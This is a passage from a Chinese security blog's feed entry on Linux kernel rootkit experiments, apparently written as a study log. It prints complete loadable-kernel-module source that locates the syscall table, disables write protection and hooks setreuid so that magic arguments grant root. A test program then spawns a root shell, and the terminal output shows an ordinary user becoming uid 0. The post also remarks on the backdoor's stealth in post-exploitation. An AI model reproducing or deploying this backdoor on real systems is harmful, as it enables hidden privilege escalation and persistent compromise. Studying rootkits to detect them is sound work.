captainhook.ko</span></span><br><span class="line">root@r00t:~/LKM/pname<span class="comment"># cd</span></span><br><span class="line">root@r00t:~<span class="comment"># ./testPname </span></span><br><span class="line">Enter process to find</span><br><span class="line">sshd</span><br><span class="line">PID = 655</span><br><span class="line">         PID = 1144</span><br><span class="line">                   PID = 1209</span><br><span class="line">                             PID = 1248</span><br><span class="line">                                       PID = 1285</span><br><span class="line">                                                 System call returned 0</span><br><span class="line">root@r00t:~<span class="comment"># rmmod captainhook</span></span><br><span class="line">root@r00t:~<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## dmesg中输出如下:</span></span><br><span class="line">[ 1月13 21:49] Captain Hook loaded successfully..</span><br><span class="line">[ 1月13 21:50] Pname Syscall:HOOK! HOOK! HOOK! HOOK!...ROOOFFIIOO!</span><br><span class="line">[ +11.875845] Unloaded Captain Hook successfully</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="动态获取系统调用表"><a href="#动态获取系统调用表" class="headerlink" title="动态获取系统调用表"></a>动态获取系统调用表</h1>依照<a href="https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/">这篇文章</a>复制过来的代码以及编译运行的结果如下,对于我的虚拟机ubuntu 15.10的4.2.2的内核而言，我修改了模块代码的两个地方(因为这两个地方报错)。第一处是kmalloc和kfree函数未实现，因此加入<code>#include &lt;linux/slab.h&gt;</code>头文件即可。第二处是new结构体指针的uid和gid几个字段赋值强转失败，查看源码后改为宏<code>GLOBAL_ROOT_UID</code>和<code>GLOBAL_ROOT_GID</code>即可。而以下代码的大体意思就是动态地在模块被加载的时候hook掉setreuid系统调用，硬编码写死一个触发条件<code>if ((ruid == 7310) &amp;&amp; (euid == 0137))</code>即应用层传递过来的参数如果满足即可根据cred来获取root权限。因此如果被种植类似这样的后门是很危险的，只要低权限账户运行test程序即可获取root权限。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ls</span><br><span class="line">kernel_sys.c  Makefile  test.c</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ cat kernel_sys.c </span><br><span class="line"><span class="comment">#include &lt;linux/init.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/proc_fs.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kallsyms.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/uaccess.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/init.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/file.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/fs.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/uaccess.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/version.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/slab.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define PROC_V          &quot;/proc/version&quot;</span></span><br><span class="line"><span class="comment">#define BOOT_PATH       &quot;/boot/System.map-&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#define MAX_LEN         256</span></span><br><span class="line"> </span><br><span class="line">unsigned long *syscall_table; </span><br><span class="line">int sys_found = 0;</span><br><span class="line"> </span><br><span class="line">asmlinkage int (* orig_setreuid) (uid_t ruid, uid_t euid);</span><br><span class="line"> </span><br><span class="line">asmlinkage int new_setreuid (uid_t ruid, uid_t euid) &#123;</span><br><span class="line"> </span><br><span class="line">    struct cred *new;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">if</span> ((ruid == 7310) &amp;&amp; (euid == 0137))   &#123;</span><br><span class="line"> </span><br><span class="line">         printk(KERN_ALERT <span class="string">&quot;[Correct] \n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#if LINUX_VERSION_CODE &lt; KERNEL_VERSION(2, 6, 29)    </span></span><br><span class="line">                                 </span><br><span class="line">            current-&gt;uid = current -&gt; gid = 0;</span><br><span class="line">            current -&gt; euid = current -&gt; egid = 0;</span><br><span class="line">            current -&gt; suid = current -&gt; sgid = 0;</span><br><span class="line">            current -&gt; fsuid = current -&gt; fsgid = 0;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#else</span></span><br><span class="line"> </span><br><span class="line">            new = prepare_creds();</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> ( new != NULL ) &#123;</span><br><span class="line"> </span><br><span class="line">                new-&gt;uid = GLOBAL_ROOT_UID;</span><br><span class="line">new-&gt;gid = GLOBAL_ROOT_GID;</span><br><span class="line">                new-&gt;euid = GLOBAL_ROOT_UID;</span><br><span class="line">new-&gt;egid = GLOBAL_ROOT_GID;</span><br><span class="line">                new-&gt;suid = GLOBAL_ROOT_UID;</span><br><span class="line">new-&gt;sgid = GLOBAL_ROOT_GID;</span><br><span class="line">                new-&gt;fsuid = GLOBAL_ROOT_UID;</span><br><span class="line">new-&gt;fsgid = GLOBAL_ROOT_GID;</span><br><span class="line"> </span><br><span class="line">                commit_creds(new);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">#endif</span></span><br><span class="line"> </span><br><span class="line">         <span class="built_in">return</span> orig_setreuid (0, 0);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">return</span> orig_setreuid (ruid, euid);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">char *search_file(char *buf) &#123;</span><br><span class="line">     </span><br><span class="line">    struct file *f;</span><br><span class="line">    char *ver;</span><br><span class="line">    mm_segment_t oldfs;</span><br><span class="line"> </span><br><span class="line">    oldfs = get_fs();</span><br><span class="line">    set_fs (KERNEL_DS);</span><br><span class="line">     </span><br><span class="line">    f = filp_open(PROC_V, O_RDONLY, 0);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(f) || ( f == NULL )) &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="built_in">return</span> NULL;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    memset(buf, 0, MAX_LEN);</span><br><span class="line">     </span><br><span class="line">    vfs_read(f, buf, MAX_LEN, &amp;f-&gt;f_pos);</span><br><span class="line">     </span><br><span class="line">    ver = strsep(&amp;buf, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    ver = strsep(&amp;buf, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    ver = strsep(&amp;buf, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         </span><br><span class="line">    filp_close(f, 0);   </span><br><span class="line">    set_fs(oldfs);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">return</span> ver;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static int find_sys_call_table (char *kern_ver)</span><br><span class="line"> &#123;</span><br><span class="line"> </span><br><span class="line">    char buf[MAX_LEN];</span><br><span class="line">    int i = 0;</span><br><span class="line">    char *filename;</span><br><span class="line">    char *p;</span><br><span class="line">    struct file *f = NULL;</span><br><span class="line"> </span><br><span class="line">    mm_segment_t oldfs;</span><br><span class="line"> </span><br><span class="line">    oldfs = get_fs();</span><br><span class="line">    set_fs (KERNEL_DS);</span><br><span class="line">     </span><br><span class="line">    filename = kmalloc(strlen(kern_ver)+strlen(BOOT_PATH)+1, GFP_KERNEL);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( filename == NULL ) &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    memset(filename, 0, strlen(BOOT_PATH)+strlen(kern_ver)+1);</span><br><span class="line">     </span><br><span class="line">    strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));</span><br><span class="line">    strncat(filename, kern_ver, strlen(kern_ver));</span><br><span class="line">     </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\nPath %s\n&quot;</span>, filename);</span><br><span class="line">     </span><br><span class="line">    f = filp_open(filename, O_RDONLY, 0);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(f) || ( f == NULL )) &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    memset(buf, 0x0, MAX_LEN);</span><br><span class="line"> </span><br><span class="line">    p = buf;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (vfs_read(f, p+i, 1, &amp;f-&gt;f_pos) == 1) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ( p[i] == <span class="string">&#x27;\n&#x27;</span> || i == 255 ) &#123;</span><br><span class="line">         </span><br><span class="line">            i = 0;</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">if</span> ( (strstr(p, <span class="string">&quot;sys_call_table&quot;</span>)) != NULL ) &#123;</span><br><span class="line">                 </span><br><span class="line">                char *sys_string;</span><br><span class="line">                 </span><br><span class="line">                sys_string = kmalloc(MAX_LEN, GFP_KERNEL);  </span><br><span class="line">                 </span><br><span class="line">                <span class="keyword">if</span> ( sys_string == NULL ) &#123; </span><br><span class="line">                 </span><br><span class="line">                    filp_close(f, 0);</span><br><span class="line">                    set_fs(oldfs);</span><br><span class="line">     </span><br><span class="line">                    kfree(filename);</span><br><span class="line">     </span><br><span class="line">                    <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                memset(sys_string, 0, MAX_LEN);</span><br><span class="line">                strncpy(sys_string, strsep(&amp;p, <span class="string">&quot; &quot;</span>), MAX_LEN);</span><br><span class="line">             </span><br><span class="line">                syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);</span><br><span class="line">                 </span><br><span class="line">                kfree(sys_string);</span><br><span class="line">                 </span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">             </span><br><span class="line">            memset(buf, 0x0, MAX_LEN);</span><br><span class="line">            <span class="built_in">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        i++;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    filp_close(f, 0);</span><br><span class="line">    set_fs(oldfs);</span><br><span class="line">     </span><br><span class="line">    kfree(filename);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static int init(void) &#123;</span><br><span class="line"> </span><br><span class="line">    char *kern_ver;</span><br><span class="line">    char *buf;</span><br><span class="line">     </span><br><span class="line">    buf = kmalloc(MAX_LEN, GFP_KERNEL);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( buf == NULL ) &#123;</span><br><span class="line">     </span><br><span class="line">        sys_found = 1;</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;   </span><br><span class="line"> </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\nHIJACK INIT\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    kern_ver = search_file(buf);</span><br><span class="line">         </span><br><span class="line">    <span class="keyword">if</span> ( kern_ver == NULL ) &#123;</span><br><span class="line"> </span><br><span class="line">        sys_found = 1;</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Kernel version found: %s\n&quot;</span>, kern_ver);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( find_sys_call_table(kern_ver) == -1 ) &#123;</span><br><span class="line">     </span><br><span class="line">        sys_found = 1;</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    sys_found = 0;</span><br><span class="line">     </span><br><span class="line">    write_cr0 (read_cr0 () &amp; (~ 0x10000));</span><br><span class="line">     </span><br><span class="line">    orig_setreuid = syscall_table[__NR_setreuid32];</span><br><span class="line">    syscall_table[__NR_setreuid32] = new_setreuid;</span><br><span class="line"> </span><br><span class="line">    write_cr0 (read_cr0 () | 0x10000);</span><br><span class="line">     </span><br><span class="line">    kfree(buf);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static void <span class="built_in">exit</span>(void) &#123;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( sys_found == 0 ) &#123;</span><br><span class="line">     </span><br><span class="line">        write_cr0 (read_cr0 () &amp; (~ 0x10000));</span><br><span class="line"> </span><br><span class="line">        syscall_table[__NR_setreuid32] = orig_setreuid;</span><br><span class="line"> </span><br><span class="line">        write_cr0 (read_cr0 () | 0x10000);</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\nHIJACK EXIT\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">module_init(init);</span><br><span class="line">module_exit(<span class="built_in">exit</span>);</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ make</span><br><span class="line">make -C /lib/modules/4.2.2/build SUBDIRS=/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">  CC [M]  /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.o</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In <span class="keyword">function</span> ‘find_sys_call_table’:</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:171:33: warning: cast to pointer from <span class="built_in">integer</span> of different size [-Wint-to-pointer-cast]</span><br><span class="line">                 syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);</span><br><span class="line">                                 ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:171:31: warning: assignment from incompatible pointer <span class="built_in">type</span> [-Wincompatible-pointer-types]</span><br><span class="line">                 syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);</span><br><span class="line">                               ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In <span class="keyword">function</span> ‘init’:</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:231:19: warning: assignment makes pointer from <span class="built_in">integer</span> without a cast [-Wint-conversion]</span><br><span class="line">     orig_setreuid = syscall_table[__NR_setreuid32];</span><br><span class="line">                   ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:232:36: warning: assignment makes <span class="built_in">integer</span> from pointer without a cast [-Wint-conversion]</span><br><span class="line">     syscall_table[__NR_setreuid32] = new_setreuid;</span><br><span class="line">                                    ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In <span class="keyword">function</span> ‘<span class="built_in">exit</span>’:</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:247:40: warning: assignment makes <span class="built_in">integer</span> from pointer without a cast [-Wint-conversion]</span><br><span class="line">         syscall_table[__NR_setreuid32] = orig_setreuid;</span><br><span class="line">                                        ^</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.mod.o</span><br><span class="line">  LD [M]  /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ cat test.c </span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line">int <span class="function"><span class="title">main</span></span> () &#123;</span><br><span class="line"> </span><br><span class="line">        setreuid (7310, 0137);</span><br><span class="line">        system (<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ id</span><br><span class="line">uid=1000(r00t) gid=1000(r00t) groups=1000(r00t),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ls</span><br><span class="line">kernel_sys.c   kernel_sys.mod.c  kernel_sys.o  modules.order   test.c</span><br><span class="line">kernel_sys.ko  kernel_sys.mod.o  Makefile      Module.symvers</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ sudo insmod kernel_sys.ko</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ dmesg | tail -n 4</span><br><span class="line">               HIJACK INIT</span><br><span class="line">[ 2537.374798] Kernel version found: 4.2.2</span><br><span class="line">[ 2537.374802] </span><br><span class="line">               Path /boot/System.map-4.2.2</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ gcc -o <span class="built_in">test</span> test.c </span><br><span class="line">test.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">test.c:5:9: warning: implicit declaration of <span class="keyword">function</span> ‘setreuid’ [-Wimplicit-function-declaration]</span><br><span class="line">         setreuid (7310, 0137);</span><br><span class="line">         ^</span><br><span class="line">test.c:6:9: warning: implicit declaration of <span class="keyword">function</span> ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">         system (<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">         ^</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ./<span class="built_in">test</span> </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(r00t)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后续实验应该会参照谷大神的<a href="https://github.com/NoviceLive/research-rootkit">教程</a>继续学习，关于其防范策略目前还没有什么非常好用的方法，只能靠管理员多注意了。在后渗透测试阶段此隐蔽性非常强，特别是内核级的相对于应用级的更加难以发现，其中有一个应用级的用bash实现的可以<a href="https://github.com/cloudsec/brootkit">参考学习</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考:&lt;br&gt;&lt;a href=&quot;http://www.freebuf.com/articles/system/54263.html&quot;&gt;http://www.freebuf.com/articles/system/54263.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://chirath02.wordpress.com/tag/asmlinkage/&quot;&gt;https://chirath02.wordpress.com/tag/asmlinkage/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&amp;mid=2655113676&amp;idx=3&amp;sn=07e450fb7553f87fa3c9fa5fd186c5b0&amp;chksm=bc864c238bf1c5350ddc594555f4412faa42df025d49e2364884b851d7ea9a1e2d1cfda697d4#rd&quot;&gt;r00tk1t基础实验&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/&quot;&gt;https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/&quot;&gt;https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.mallocfree.com/data/compile-linux-kernel-mallocfree.com.pdf&quot;&gt;http://www.mallocfree.com/data/compile-linux-kernel-mallocfree.com.pdf&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/&quot;&gt;https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
      <category term="misc" scheme="https://embpgp.github.io/categories/study/misc/"/>
    
    
      <category term="C/C++" scheme="https://embpgp.github.io/tags/C-C/"/>
    
      <category term="exploit" scheme="https://embpgp.github.io/tags/exploit/"/>
    
      <category term="r00tk1t" scheme="https://embpgp.github.io/tags/r00tk1t/"/>
    
  </entry>
  
  <entry>
    <title>fmt_exploit</title>
    <link href="https://embpgp.github.io/2017/01/07/fmt-exploit/"/>
    <id>https://embpgp.github.io/2017/01/07/fmt-exploit/</id>
    <published>2017-01-07T10:38:48.000Z</published>
    <updated>2025-03-11T12:14:38.966Z</updated>
    
